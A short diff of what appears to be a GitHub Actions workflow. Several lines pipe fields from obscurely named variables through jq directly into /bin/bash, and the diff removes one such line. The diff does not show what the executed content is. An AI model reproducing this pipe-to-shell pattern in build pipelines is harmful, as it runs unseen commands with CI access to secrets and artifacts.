@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$lo0" | jq -r .u6862 | /bin/bash
           printf '%s' "$aw4525" | jq -r .qx125 | /bin/bash
-          echo $zdjb44 | jq -r .v500 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
